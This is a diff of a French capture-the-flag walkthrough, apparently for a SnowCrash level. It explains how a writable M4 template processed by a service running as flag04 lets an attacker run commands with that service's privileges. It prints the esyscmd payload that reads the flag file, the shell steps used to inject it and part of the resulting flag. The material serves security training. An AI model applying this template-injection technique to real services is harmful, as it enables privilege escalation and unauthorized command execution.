@@ -1,4 +1,4 @@
-# Level04 — Comprendre l’injection de macro M4
+# Level04 — Exploiter un modèle M4 modifiable
 
 ## Objectif
 
@@ -16,23 +16,65 @@ Résultat :
 In the beginning was the Word.
 ```
 
-L’indice oriente vers le traitement de texte. L’identification de M4 repose ensuite sur la recherche des services et des fichiers liés au niveau ; la sortie de cette recherche reste à conserver sur la VM.
+L’indice ne donne ni un programme ni un chemin. Il renvoie à Babel, dont le nom est associé aux langues et aux mots. `babel` devient donc un mot-clé à rechercher dans les services de la VM.
 
-## 2. Vérifier le service et les permissions
+## 2. Trouver le service
+
+```bash
+systemctl list-unit-files --all | grep -i babel
+```
+
+Cette recherche fait apparaître `babel.service`. Elle donne le nom exact du service à examiner ; elle ne dit pas encore ce qu’il exécute.
+
+## 3. Lire ce que le service exécute
+
+```bash
+systemctl cat babel.service
+```
+
+La sortie observée est :
+
+```ini
+[Service]
+Type=oneshot
+User=flag04
+ExecStart=/opt/snowcrash/level04/babel.sh
+StandardOutput=journal
+StandardError=journal
+```
+
+Cette sortie permet d’établir trois faits :
+
+- le service s’exécute avec l’identité `flag04` ;
+- il lance le script `/opt/snowcrash/level04/babel.sh` ;
+- ses messages sont envoyés dans le journal système.
+
+Le service ne donne pas encore le moteur utilisé, ni le nom du fichier traité. Le script est donc le prochain élément à examiner.
+
+## 4. Suivre le script lancé par le service
+
+```bash
+cat /opt/snowcrash/level04/babel.sh
+```
+
+Le contenu du script montre que M4 traite `/var/lib/babel/templates/template.m4` et que le résultat est écrit dans `/var/lib/babel/output.conf`.
+
+La chaîne devient alors concrète : `babel.service` lance `babel.sh` sous `flag04`, puis ce script donne le modèle à M4 et enregistre le résultat.
+
+## 5. Examiner le modèle et ses permissions
 
 ```bash
 id
-systemctl cat babel.service
 ls -l /var/lib/babel/templates/template.m4
+sed -n '1,80p' /var/lib/babel/templates/template.m4
 ```
 
-Ces commandes permettent de vérifier que :
+La commande `sed` permet de lire le début du modèle sans partir d’une hypothèse sur son contenu. Les deux autres commandes permettent de vérifier que :
 
 - le modèle `template.m4` est modifiable par `level04` ;
-- le service Babel traite ce modèle ;
-- le service s’exécute sous l’identité `flag04`.
+- `level04` possède, directement ou par groupe, le droit correspondant.
 
-La faille repose donc sur la relation suivante :
+Le problème est maintenant établi, mais l’exploitation ne l’est pas encore : il faut comprendre les instructions reconnues par M4.
 
 ```text
 template.m4 modifiable par level04
@@ -47,9 +89,9 @@ template.m4 modifiable par level04
     résultat écrit dans output.conf
 ```
 
-## 3. Comprendre M4
+## 6. Comprendre M4
 
-M4 est un processeur de macros. Une macro peut transformer du texte ou déclencher une opération prédéfinie.
+Le script a indiqué qu’il lance M4. M4 est un processeur de macros : il lit un texte, interprète les macros qu’il contient et produit un nouveau texte.
 
 Exemple inoffensif :
 
@@ -63,9 +105,23 @@ Résultat :
 Salut
 ```
 
-La macro `bonjour` a été remplacée par `Salut`. Le point important du niveau est que GNU M4 fournit aussi `esyscmd`, une macro qui exécute une commande shell et insère sa sortie dans le texte généré.
+La macro `bonjour` a été remplacée par `Salut`.
 
-## 4. Comprendre le payload
+GNU M4 propose aussi `esyscmd`, une macro qui lance une commande shell et insère sa sortie dans le texte généré. On peut le constater avec une commande inoffensive :
+
+```bash
+printf "esyscmd(\`printf test')" | m4
+```
+
+Le résultat est :
+
+```text
+test
+```
+
+Cette fois, M4 n’a pas seulement remplacé du texte : il a exécuté `printf test`. Puisque le service lance M4 sous `flag04`, une commande placée dans le modèle serait lancée avec cette identité.
+
+## 7. Construire le payload
 
 Le fichier [payload.m4](payload.m4) contient une seule instruction :
 
@@ -82,7 +138,7 @@ esyscmd(`cat /home/flag04/.flag')
 
 Le résultat de `cat` est inséré dans le document généré par M4, puis écrit dans `/var/lib/babel/output.conf`.
 
-## 5. Modifier le modèle
+## 8. Modifier le modèle
 
 Ajouter le payload à la fin du modèle :
 
@@ -99,7 +155,7 @@ La différence entre les opérateurs est importante :
 
 On utilise `>>` afin de conserver les instructions originales du modèle. Les apostrophes autour de `EOF` empêchent également le shell d’interpréter le contenu du payload.
 
-## 6. Lire le résultat généré
+## 9. Lire le résultat généré
 
 Après le passage du service, afficher les dernières lignes de la sortie :
 
@@ -115,7 +171,7 @@ ne2searoevaevoem4ov4ar8ap
 
 `tail -n 3` limite l’affichage aux trois dernières lignes, là où la sortie de la macro ajoutée est attendue.
 
-## 7. Passer à `level05`
+## 10. Passer à `level05`
 
 ```bash
 su - level05
@@ -141,4 +197,4 @@ Les niveaux 03 et 04 exploitent la même erreur de confiance : un service privil
 
 ## Traçabilité à conserver
 
-Conserver les sorties de `id`, `systemctl cat`, `ls -l`, `tail` et `id -un`. La recherche initiale qui a permis d’identifier Babel reste également à documenter sur la VM.
+Conserver les sorties de la recherche `systemctl list-unit-files`, de `systemctl cat`, de `cat babel.sh`, de `id`, de `ls -l`, de `tail` et de `id -un`.
